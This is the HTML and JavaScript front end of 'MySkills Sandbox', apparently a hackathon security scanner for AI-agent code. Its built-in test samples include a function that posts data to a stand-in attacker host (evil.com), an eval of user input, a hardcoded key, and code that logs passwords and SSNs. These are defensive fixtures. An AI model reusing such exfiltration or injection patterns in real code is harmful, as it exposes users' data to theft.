<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MySkills Sandbox - Security Verification for AI Agents</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-primary: #000000;
      --bg-secondary: #0a0a0a;
      --bg-tertiary: #141414;
      --glass-bg: rgba(255, 255, 255, 0.05);
      --glass-bg-strong: rgba(255, 255, 255, 0.08);
      --glass-border: rgba(255, 255, 255, 0.1);
      --glass-border-strong: rgba(255, 255, 255, 0.15);
      --glow-green: rgba(34, 197, 94, 0.4);
      --glow-red: rgba(239, 68, 68, 0.3);
      --glow-yellow: rgba(234, 179, 8, 0.3);
      --text-primary: #ffffff;
      --text-secondary: #e5e7eb;
      --text-muted: #9ca3af;
      --text-dim: #6b7280;
    }

    * {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      box-sizing: border-box;
    }

    html, body {
      padding: 0;
      margin: 0;
      min-height: 100vh;
      overflow-x: hidden;
    }

    body {
      background: var(--bg-primary);
      color: var(--text-primary);
      -webkit-font-smoothing: antialiased;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(34, 197, 94, 0.08), transparent),
        radial-gradient(ellipse 60% 40% at 100% 50%, rgba(34, 211, 238, 0.05), transparent),
        radial-gradient(ellipse 60% 40% at 0% 80%, rgba(239, 68, 68, 0.05), transparent);
      pointer-events: none;
      z-index: 0;
    }

    .glass-card {
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      border-radius: 16px;
      backdrop-filter: blur(20px);
    }

    .glass-card-strong {
      background: var(--glass-bg-strong);
      border: 1px solid var(--glass-border-strong);
      border-radius: 20px;
      backdrop-filter: blur(20px);
    }

    .gradient-text {
      background: linear-gradient(135deg, #22c55e, #22d3ee);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .code-font {
      font-family: 'JetBrains Mono', 'SF Mono', 'Monaco', 'Consolas', monospace;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    .pulse {
      animation: pulse 1.5s ease-in-out infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .spinner {
      animation: spin 1s linear infinite;
    }

    .hidden { display: none !important; }
    .show { display: block !important; }

    .risk-high { border-color: rgba(239, 68, 68, 0.5); background: rgba(239, 68, 68, 0.1); }
    .risk-medium { border-color: rgba(234, 179, 8, 0.5); background: rgba(234, 179, 8, 0.1); }
    .risk-low { border-color: rgba(34, 197, 94, 0.3); background: rgba(34, 197, 94, 0.05); }
  </style>
</head>
<body class="min-h-screen text-white overflow-x-hidden relative z-10">
  <div class="container max-w-6xl mx-auto px-4 py-8">

    <!-- Header -->
    <div class="text-center mb-12">
      <div class="flex items-center justify-center gap-3 mb-6">
        <span class="px-4 py-1.5 rounded-full text-sm font-semibold" style="background: rgba(34, 197, 94, 0.2); color: #22c55e;">BLITZ PRO 2026</span>
        <span class="text-gray-600">|</span>
        <span class="px-4 py-1.5 rounded-full text-sm font-semibold" style="background: rgba(234, 179, 8, 0.2); color: #eab308;">SECURITY TRACK</span>
      </div>
      <div class="text-6xl mb-4">üõ°Ô∏è</div>
      <h1 class="text-5xl font-black mb-4 gradient-text">MySkills Sandbox</h1>
      <p class="text-2xl text-gray-400 mb-2">Comprehensive Security Verification for AI Agents</p>
      <p class="text-lg text-gray-500">"Just like App Store review ensures safety, MySkills Sandbox ensures Agent safety"</p>
    </div>

    <!-- Main Card -->
    <div class="glass-card-strong p-8 mb-8">
      <!-- Input Section -->
      <div id="inputSection">
        <h2 class="text-2xl font-bold mb-6 flex items-center gap-3">
          <span>üîç</span> Verify Agent Security
        </h2>

        <!-- Sample code selector -->
        <div class="mb-6 p-4 rounded-lg" style="background: rgba(34, 197, 94, 0.1);">
          <p class="text-sm text-gray-400 mb-2">Select a sample agent to test:</p>
          <div class="flex gap-2 flex-wrap">
            <button onclick="loadSample('safe')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-green-600/20 text-green-400 hover:bg-green-600/30 transition-colors">Safe Agent</button>
            <button onclick="loadSample('lodash')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-yellow-600/20 text-yellow-400 hover:bg-yellow-600/30 transition-colors">Vulnerable Dependencies</button>
            <button onclick="loadSample('suspicious')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-red-600/20 text-red-400 hover:bg-red-600/30 transition-colors">Suspicious Code</button>
            <button onclick="loadSample('dataleak')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-red-600/20 text-red-400 hover:bg-red-600/30 transition-colors">Data Leakage</button>
          </div>
        </div>

        <div class="mb-6">
          <label class="block text-sm font-medium text-gray-400 mb-2">Agent ID / Address</label>
          <input type="text" id="agentId" placeholder="0x1234... or agent-name"
            class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none code-font text-sm">
        </div>

        <div class="mb-6">
          <label class="block text-sm font-medium text-gray-400 mb-2">Agent Code (JavaScript/TypeScript)</label>
          <textarea id="agentCode" rows="8" placeholder="Paste your agent code here..."
            class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none code-font text-sm"></textarea>
        </div>

        <div class="mb-6">
          <label class="block text-sm font-medium text-gray-400 mb-2">Verification Type</label>
          <select id="verifyType" class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none">
            <option value="comprehensive">Comprehensive Security Audit</option>
            <option value="code">Code Analysis Only</option>
            <option value="behavior">Behavior Sandbox Only</option>
            <option value="privacy">Privacy Audit Only</option>
          </select>
        </div>

        <button id="startBtn" onclick="startVerification()"
          class="w-full py-4 rounded-lg font-bold text-lg transition-all"
          style="background: linear-gradient(135deg, #22c55e, #22d3ee); color: black;">
          üöÄ Start Security Verification
        </button>
      </div>

      <!-- Scanning Section -->
      <div id="scanningSection" class="hidden">
        <div class="text-center py-12">
          <div class="w-20 h-20 mx-auto mb-6 rounded-full border-4 border-green-500 border-t-transparent spinner"></div>
          <h3 class="text-2xl font-bold mb-2">Analyzing Agent Security...</h3>
          <p class="text-gray-400 mb-8" id="scanStatus">Initializing security scanner...</p>

          <!-- Progress Steps -->
          <div class="max-w-md mx-auto space-y-4 text-left" id="scanSteps">
            <div class="flex items-center gap-3 text-gray-500">
              <span class="w-6 h-6 rounded-full bg-gray-800 flex items-center justify-center text-sm">1</span>
              <span>Code Security Analysis</span>
            </div>
            <div class="flex items-center gap-3 text-gray-500">
              <span class="w-6 h-6 rounded-full bg-gray-800 flex items-center justify-center text-sm">2</span>
              <span>Behavior Sandbox Verification</span>
            </div>
            <div class="flex items-center gap-3 text-gray-500">
              <span class="w-6 h-6 rounded-full bg-gray-800 flex items-center justify-center text-sm">3</span>
              <span>Data Privacy Audit</span>
            </div>
            <div class="flex items-center gap-3 text-gray-500">
              <span class="w-6 h-6 rounded-full bg-gray-800 flex items-center justify-center text-sm">4</span>
              <span>Generating Report...</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Results Section -->
      <div id="resultsSection" class="hidden">
        <!-- Score Header -->
        <div class="text-center mb-8">
          <div class="text-7xl font-black gradient-text mb-2" id="overallScore">--</div>
          <p class="text-xl text-gray-400">Overall Security Score</p>
          <div class="inline-flex items-center gap-2 mt-3 px-4 py-2 rounded-full" id="riskBadge">
            <span class="w-2 h-2 rounded-full bg-green-500 pulse"></span>
            <span class="text-green-400 font-semibold" id="riskText">Analyzing...</span>
          </div>
        </div>

        <!-- Analysis Results -->
        <div class="grid md:grid-cols-3 gap-6 mb-8" id="categoryScores">
          <!-- Filled dynamically -->
        </div>

        <!-- Detailed Report -->
        <div class="glass-card-strong p-6 mb-6">
          <h4 class="font-bold text-xl mb-4 flex items-center gap-2">
            <span>üìã</span> Security Report Details
          </h4>
          <div id="issueList">
            <!-- Filled dynamically -->
          </div>
        </div>

        <!-- Actions -->
        <div class="flex gap-4">
          <button onclick="downloadReport()" class="flex-1 py-3 rounded-lg font-semibold border border-gray-600 hover:border-green-500 transition-colors">
            üì• Download Report
          </button>
          <button onclick="resetForm()" class="flex-1 py-3 rounded-lg font-semibold transition-colors"
            style="background: rgba(34, 197, 94, 0.2); color: #22c55e;">
            üîÑ Scan Another Agent
          </button>
        </div>
      </div>

      <!-- Error Section -->
      <div id="errorSection" class="hidden">
        <div class="text-center py-12">
          <div class="text-6xl mb-4">‚ùå</div>
          <h3 class="text-2xl font-bold mb-2 text-red-400">Scan Failed</h3>
          <p class="text-gray-400 mb-6" id="errorMessage">An error occurred during scanning.</p>
          <button onclick="resetForm()" class="px-6 py-3 rounded-lg font-semibold bg-gray-700 hover:bg-gray-600 transition-colors">
            Try Again
          </button>
        </div>
      </div>
    </div>

    <!-- Value Proposition -->
    <div class="grid md:grid-cols-3 gap-6 text-center">
      <div class="glass-card p-6">
        <div class="text-3xl mb-2">üè¢</div>
        <h4 class="font-bold mb-1">For Enterprises</h4>
        <p class="text-sm text-gray-400">Use third-party agents with confidence</p>
      </div>
      <div class="glass-card p-6">
        <div class="text-3xl mb-2">üí∞</div>
        <h4 class="font-bold mb-1">For Developers</h4>
        <p class="text-sm text-gray-400">Earn $10-50 per security audit</p>
      </div>
      <div class="glass-card p-6">
        <div class="text-3xl mb-2">üåê</div>
        <h4 class="font-bold mb-1">For Ecosystem</h4>
        <p class="text-sm text-gray-400">Safer agents for everyone</p>
      </div>
    </div>

    <!-- Footer -->
    <div class="text-center mt-12 text-gray-500 text-sm">
      <p>Powered by <span class="text-green-400 font-semibold">Monad Blockchain</span> ‚Ä¢ Lightning-fast security verification</p>
      <p class="mt-1">myskillsboss2026.ddttupupo.buzz</p>
    </div>

  </div>

  <script>
    // API configuration
    const API_BASE = window.location.origin;
    let currentResult = null;

    // Sample agent codes
    const sampleAgents = {
      safe: `// Safe agent - no security issues
function processData(input) {
  // Validate input
  if (!input || typeof input !== 'string') {
    throw new Error('Invalid input');
  }

  // Process data safely
  const result = input.toUpperCase();
  return result;
}

// Export for use
module.exports = { processData };`,

      lodash: `// Agent with vulnerable dependencies
// This code itself is safe, but package.json has vulnerable lodash

const _ = require('lodash');

function processUserData(users) {
  // Using lodash functions
  const activeUsers = _.filter(users, user => user.active);
  const sortedUsers = _.orderBy(activeUsers, ['name'], ['asc']);

  return sortedUsers;
}

module.exports = { processUserData };`,

      suspicious: `// Suspicious agent - malicious patterns
function UserDataProcessor() {
  // Potential infinite loop
  while (true) {
    // Process data
  }
}

// Dynamic code execution
function executeCode(userInput) {
  eval(userInput);
}

// External data exfiltration
function sendData(data) {
  fetch('https://external-api.evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}

// Hardcoded secret
const API_KEY = 'sk-1234567890abcdefghijklmnop';

module.exports = { UserDataProcessor, executeCode, sendData };`,

      dataleak: `// Agent with privacy issues
function logUserActivity(user) {
  // Logging sensitive data
  console.log('User login:', user.email, user.password);
  console.log('SSN:', user.ssn);
  console.log('Credit Card:', user.creditCard);
}

function storeToken(token) {
  // Storing token in localStorage (unencrypted)
  localStorage.setItem('authToken', token);
}

function sendDataExternal(data) {
  // Sending to third-party without encryption
  fetch('https://api.thirdparty.com/analyze', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email: data.userEmail,
      phone: data.userPhone,
      address: data.homeAddress
    })
  });
}

module.exports = { logUserActivity, storeToken, sendDataExternal };`
    };

    function loadSample(type) {
      document.getElementById('agentCode').value = sampleAgents[type] || '';
      document.getElementById('agentId').value = `sample-${type}-agent`;
    }

    async function startVerification() {
      const agentCode = document.getElementById('agentCode').value;
      const agentId = document.getElementById('agentId').value || 'unknown';
      const verifyType = document.getElementById('verifyType').value;

      if (!agentCode.trim()) {
        alert('Please enter agent code or select a sample');
        return;
      }

      // Show scanning UI
      document.getElementById('inputSection').classList.add('hidden');
      document.getElementById('scanningSection').classList.remove('hidden');
      document.getElementById('resultsSection').classList.add('hidden');
      document.getElementById('errorSection').classList.add('hidden');

      // Animate steps
      const steps = document.querySelectorAll('#scanSteps > div');
      const statuses = [
        'Scanning for smart contract vulnerabilities...',
        'Monitoring behavior in isolated sandbox...',
        'Analyzing data flows and privacy patterns...',
        'Compiling security assessment report...'
      ];

      let currentStep = 0;
      const interval = setInterval(() => {
        if (currentStep < steps.length) {
          steps[currentStep].classList.remove('text-gray-500');
          steps[currentStep].classList.add('text-green-400');
          steps[currentStep].querySelector('span:first-child').innerHTML = '‚úì';

          if (currentStep < statuses.length) {
            document.getElementById('scanStatus').textContent = statuses[currentStep];
          }
          currentStep++;
        } else {
          clearInterval(interval);
        }
      }, 800);

      try {
        // Call real API
        const response = await fetch(`${API_BASE}/api/sandbox/scan`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            agentCode,
            agentId,
            verifyType,
            language: 'javascript'
          })
        });

        if (!response.ok) {
          throw new Error(`API error: ${response.status}`);
        }

        const result = await response.json();
        currentResult = result;

        // Display results
        displayResults(result);

      } catch (error) {
        console.error('Scan error:', error);

        // Show error
        document.getElementById('scanningSection').classList.add('hidden');
        document.getElementById('errorSection').classList.remove('hidden');
        document.getElementById('errorMessage').textContent =
          error.message || 'Failed to connect to security scanner. Please ensure the API server is running.';
      }
    }

    function displayResults(result) {
      document.getElementById('scanningSection').classList.add('hidden');
      document.getElementById('resultsSection').classList.remove('hidden');

      // Update score
      document.getElementById('overallScore').textContent = result.overallScore;

      // Update risk badge
      const riskBadge = document.getElementById('riskBadge');
      const riskText = document.getElementById('riskText');

      const riskColors = {
        safe: 'bg-green-500',
        low: 'bg-blue-500',
        medium: 'bg-yellow-500',
        high: 'bg-orange-500',
        critical: 'bg-red-500'
      };

      const riskLabels = {
        safe: 'Secure - No Issues Found',
        low: 'Low Risk - Minor Issues',
        medium: 'Moderate Risk - Issues Found',
        high: 'High Risk - Major Issues',
        critical: 'Critical Risk - Severe Issues'
      };

      riskBadge.querySelector('span:first-child').className =
        `w-2 h-2 rounded-full ${riskColors[result.riskLevel]} pulse`;
      riskText.textContent = riskLabels[result.riskLevel];
      riskText.className = `font-semibold ${result.riskLevel === 'safe' ? 'text-green-400' :
        result.riskLevel === 'low' ? 'text-blue-400' :
        result.riskLevel === 'medium' ? 'text-yellow-400' :
        result.riskLevel === 'high' ? 'text-orange-400' : 'text-red-400'}`;

      // Build category scores
      const categories = [
        { key: 'codeSecurity', name: 'Code Security', icon: 'üìä' },
        { key: 'behaviorSandbox', name: 'Behavior Sandbox', icon: '‚öôÔ∏è' },
        { key: 'privacyAudit', name: 'Privacy Audit', icon: 'üîí' }
      ];

      const categoryScoresHtml = categories.map(cat => {
        const score = result.categories[cat.key].score;
        const colorClass = score >= 80 ? 'text-green-400' : score >= 60 ? 'text-yellow-400' : 'text-red-400';

        return `
          <div class="glass-card-strong p-6">
            <div class="flex items-center justify-between mb-4">
              <h4 class="font-bold flex items-center gap-2">
                <span class="text-2xl">${cat.icon}</span> ${cat.name}
              </h4>
              <span class="text-2xl font-bold ${colorClass}">${score}</span>
            </div>
            <div class="space-y-2 text-sm">
              ${result.categories[cat.key].checks.map(check => `
                <div class="flex justify-between text-gray-400">
                  <span>${check.name}</span>
                  <span class="${check.passed ? 'text-green-400' : 'text-yellow-400'}">
                    ${check.passed ? '‚úì' : '‚ö†'} ${check.details || (check.passed ? 'Pass' : 'Review')}
                  </span>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      }).join('');

      document.getElementById('categoryScores').innerHTML = categoryScoresHtml;

      // Build issue list
      const allIssues = [
        ...result.categories.codeSecurity.issues,
        ...result.categories.behaviorSandbox.issues,
        ...result.categories.privacyAudit.issues
      ];

      // Group by risk level
      const criticalIssues = allIssues.filter(i => i.level === 'critical');
      const highIssues = allIssues.filter(i => i.level === 'high');
      const mediumIssues = allIssues.filter(i => i.level === 'medium');
      const lowIssues = allIssues.filter(i => i.level === 'low');

      let issueHtml = '';

      if (criticalIssues.length > 0 || highIssues.length > 0) {
        issueHtml += `
          <div class="risk-high rounded-lg p-4 mb-4">
            <div class="flex items-start gap-3">
              <span class="text-red-500 text-xl">üî¥</span>
              <div class="flex-1">
                <h5 class="font-bold text-red-400 mb-1">Critical/High Risk (${criticalIssues.length + highIssues.length} items)</h5>
                ${criticalIssues.concat(highIssues).map(issue => `
                  <p class="text-sm text-gray-300 mb-1"><strong>${issue.title}</strong></p>
                  <p class="text-xs text-gray-400 mb-2">${issue.description}</p>
                  ${issue.recommendation ? `<p class="text-xs text-gray-400">üí° ${issue.recommendation}</p>` : ''}
                `).join('')}
              </div>
            </div>
          </div>
        `;
      }

      if (mediumIssues.length > 0) {
        issueHtml += `
          <div class="risk-medium rounded-lg p-4 mb-4">
            <div class="flex items-start gap-3">
              <span class="text-yellow-500 text-xl">üü°</span>
              <div class="flex-1">
                <h5 class="font-bold text-yellow-400 mb-1">Medium Risk (${mediumIssues.length} items)</h5>
                ${mediumIssues.map(issue => `
                  <p class="text-sm text-gray-300 mb-1"><strong>${issue.title}</strong></p>
                  <p class="text-xs text-gray-400">${issue.description}</p>
                `).join('')}
              </div>
            </div>
          </div>
        `;
      }

      if (lowIssues.length > 0) {
        issueHtml += `
          <div class="risk-low rounded-lg p-4 mb-4">
            <div class="flex items-start gap-3">
              <span class="text-green-500 text-xl">üü¢</span>
              <div class="flex-1">
                <h5 class="font-bold text-green-400 mb-1">Low Risk (${lowIssues.length} items)</h5>
                ${lowIssues.map(issue => `
                  <p class="text-sm text-gray-300">${issue.title}: ${issue.description}</p>
                `).join('')}
              </div>
            </div>
          </div>
        `;
      }

      if (allIssues.length === 0) {
        issueHtml += `
          <div class="risk-low rounded-lg p-4">
            <div class="flex items-start gap-3">
              <span class="text-green-500 text-xl">‚úÖ</span>
              <div class="flex-1">
                <h5 class="font-bold text-green-400 mb-2">All Checks Passed</h5>
                <div class="grid grid-cols-2 md:grid-cols-3 gap-2 text-sm text-gray-300">
                  <span>‚Ä¢ No malicious code</span>
                  <span>‚Ä¢ No data leaks</span>
                  <span>‚Ä¢ Normal resource usage</span>
                  <span>‚Ä¢ Proper encryption</span>
                  <span>‚Ä¢ Safe file access</span>
                  <span>‚Ä¢ No infinite loops</span>
                </div>
              </div>
            </div>
          </div>
        `;
      }

      document.getElementById('issueList').innerHTML = issueHtml;
    }

    function downloadReport() {
      if (!currentResult) {
        alert('No scan result to download');
        return;
      }

      // Generate text report
      const result = currentResult;
      const lines = [];

      lines.push('MySkills Security Verification Report');
      lines.push('=====================================');
      lines.push('');
      lines.push(`Agent ID: ${result.agentId}`);
      lines.push(`Verification Date: ${result.timestamp}`);
      lines.push(`Verification Type: Comprehensive Security Audit`);
      lines.push('');
      lines.push(`OVERALL SCORE: ${result.overallScore}/100 (${result.riskLevel.toUpperCase()})`);
      lines.push('');

      // Categories
      for (const [key, category] of Object.entries(result.categories)) {
        const name = key === 'codeSecurity' ? 'CODE SECURITY' :
          key === 'behaviorSandbox' ? 'BEHAVIOR SANDBOX' : 'PRIVACY AUDIT';
        lines.push(`---`);
        lines.push(name);
        lines.push(`---`);
        lines.push(`Score: ${category.score}/100`);

        for (const check of category.checks) {
          const status = check.passed ? '‚úì' : '‚ö†';
          lines.push(`${status} ${check.name}: ${check.details}`);
        }

        for (const issue of category.issues) {
          lines.push('');
          lines.push(`[${issue.level.toUpperCase()}] ${issue.title}`);
          lines.push(`  ${issue.description}`);
          if (issue.recommendation) {
            lines.push(`  Recommendation: ${issue.recommendation}`);
          }
        }
        lines.push('');
      }

      // Summary
      lines.push('---');
      lines.push('SUMMARY');
      lines.push('---');
      lines.push(`Total Issues: ${result.summary.totalIssues}`);
      lines.push(`Critical: ${result.summary.criticalIssues}`);
      lines.push(`High: ${result.summary.highIssues}`);
      lines.push(`Medium: ${result.summary.mediumIssues}`);
      lines.push(`Low: ${result.summary.lowIssues}`);
      lines.push('');

      // Recommendations
      if (result.recommendations.length > 0) {
        lines.push('---');
        lines.push('RECOMMENDATIONS');
        lines.push('---');
        result.recommendations.forEach((rec, i) => {
          lines.push(`${i + 1}. ${rec}`);
        });
        lines.push('');
      }

      lines.push('---');
      lines.push('Generated by MySkills Sandbox');
      lines.push('Powered by Monad Blockchain');

      const reportText = lines.join('\n');

      // Download
      const blob = new Blob([reportText], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `security-report-${result.agentId}-${Date.now()}.txt`;
      a.click();
      URL.revokeObjectURL(url);
    }

    function resetForm() {
      document.getElementById('inputSection').classList.remove('hidden');
      document.getElementById('scanningSection').classList.add('hidden');
      document.getElementById('resultsSection').classList.add('hidden');
      document.getElementById('errorSection').classList.add('hidden');

      // Reset steps
      const steps = document.querySelectorAll('#scanSteps > div');
      steps.forEach(step => {
        step.classList.remove('text-green-400');
        step.classList.add('text-gray-500');
        step.querySelector('span:first-child').innerHTML =
          step.querySelector('span:first-child').textContent.replace('‚úì', '');
      });

      currentResult = null;
    }
  </script>
</body>
</html>
